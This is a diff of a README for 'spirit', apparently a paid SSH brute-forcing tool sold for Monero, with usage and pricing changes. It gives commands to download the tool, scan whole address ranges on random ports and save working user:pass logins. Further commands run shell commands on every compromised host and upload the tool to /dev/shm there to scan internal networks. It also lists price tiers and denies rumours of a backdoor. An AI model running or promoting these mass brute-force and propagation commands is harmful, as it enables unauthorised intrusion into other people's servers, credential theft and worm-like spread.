@@ -17,9 +17,9 @@ wget https://github.com/theaog/spirit/releases/download/1.30/spirit.tgz
 # unpack spirit
 tar xvf spirit.tgz
 
-# give execution rights to the go.sh script
-chmod +x go.sh
 # start the show! <class-A> <port1,port2,port3> <speed> 
+# ./spirit ports generates 3 random ports 1-65535 and keeps track of
+# already generated port numbers in ports.lst
 ./go.sh 172 $(./spirit ports) 50000
 ```
 
@@ -72,15 +72,13 @@ failed connections statistics:
 results stored in:
 - found.ssh # for quick manual connect
 - found.login # user:pass combinations that worked
-- found.lst # used by `spirit omni` for connecting en-masse
+- found.lst # used by `spirit auto-ssh` for connecting en-masse
 [26803]hosts [4000]bruted [3000]found [19803]blocked
 
 # Connect to all your found hosts automatically & run commands.
-# omni will automatically attempt to connect to hosts present in the found.lst file,
-# run commands on them and display the output to you.
-$ ./spirit omni -c 'whoami && uptime'
+$ ./spirit auto-ssh --command 'whoami && uptime'
 # Upload spirit to all hosts and scan the LAN
-$ ./spirit omni -u ./spirit -c '/dev/shm/spirit scan --lan'
+$ ./spirit auto-ssh --upload ./spirit --command '/dev/shm/spirit scan --lan'
 ```
 
 > Tip: you can automate these steps with `./spirit auto-brute` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)
@@ -113,9 +111,10 @@ Monero only, you can convert other crypto assets to XMR on https://tradeogre.com
 +--------------+-------------------+------------------+
 Use the arrow keys to navigate: ↓ ↑ → ←
 ? Select your Spirit version::
-  ▸ Basic $100
+    Basic TRIAL (3days) $10
+    Basic $100
     Pro $150
-    Ultra $300
+  ▸ Ultra $300
     Referral code
 ```
 
@@ -148,8 +147,7 @@ Open a Github [issue](https://github.com/theaog/spirit/issues) and consider encr
 
 Don't forget to give us a Star!
 
-> NOTICE: rumors have been circulating that `spirit` contains a backdoor -- that's not true, we would never do that.
-> We offer a bounty of 50XMR to whomever opens an issue in this repo and provides undeniable proof of the "alleged" backdoor.
+> NOTICE: rumors have been circulating that `spirit` contains a backdoor -- that's not true, we would never do that. We offer a bounty of 50XMR to whomever opens an issue in this repo and provides undeniable proof of the "alleged" backdoor.
 
 # Disclaimer
 
